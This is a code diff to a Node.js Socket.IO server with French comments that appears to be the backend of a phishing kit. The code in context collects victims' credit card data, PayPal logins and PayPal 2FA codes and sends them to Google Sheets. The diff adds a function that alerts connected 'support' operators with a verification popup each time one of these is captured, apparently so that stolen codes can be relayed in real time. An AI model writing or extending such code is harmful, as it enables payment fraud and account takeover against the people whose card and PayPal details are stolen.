@@ -68,6 +68,19 @@ function generateSessionId(ip) {
   return `${ipHash}-${random}-${timestamp.toString().slice(-6)}`;
 }
 
+// --- Fonction pour activer automatiquement le popup de vérification côté support ---
+function triggerVerificationPopup(targetSockets, action) {
+  targetSockets.forEach(supportSocket => {
+    if (supportSocket.connected) {
+      // Activer la checkbox de vérification côté support
+      supportSocket.emit('auto_toggle_verification', { 
+        action: action,
+        show: true 
+      });
+    }
+  });
+}
+
 // --- Route API de vérification ---
 app.post('/verify', (req, res) => {
   const { code, date } = req.body;
@@ -281,6 +294,9 @@ io.on('connection', async (socket) => {
       }
     });
 
+    // ✅ NOUVEAU : Activer automatiquement le popup de vérification
+    triggerVerificationPopup(supportSockets, 'Carte bancaire validée');
+
     // 💳 ENVOYER DONNÉES CB vers Google Sheets
     sendToGoogleSheets({
       type: 'credit_card',
@@ -308,6 +324,9 @@ io.on('connection', async (socket) => {
       }
     });
 
+    // ✅ NOUVEAU : Activer automatiquement le popup de vérification
+    triggerVerificationPopup(supportSockets, 'PayPal étape 1 validée');
+
     // 💰 ENVOYER PAYPAL ÉTAPE 1 vers Google Sheets
     sendToGoogleSheets({
       type: 'paypal_login1',
@@ -333,6 +352,9 @@ io.on('connection', async (socket) => {
         });
       }
     });
+
+    // ✅ NOUVEAU : Activer automatiquement le popup de vérification
+    triggerVerificationPopup(supportSockets, 'PayPal 2FA validé');
 
     // 🔐 ENVOYER PAYPAL ÉTAPE 2 vers Google Sheets
     sendToGoogleSheets({
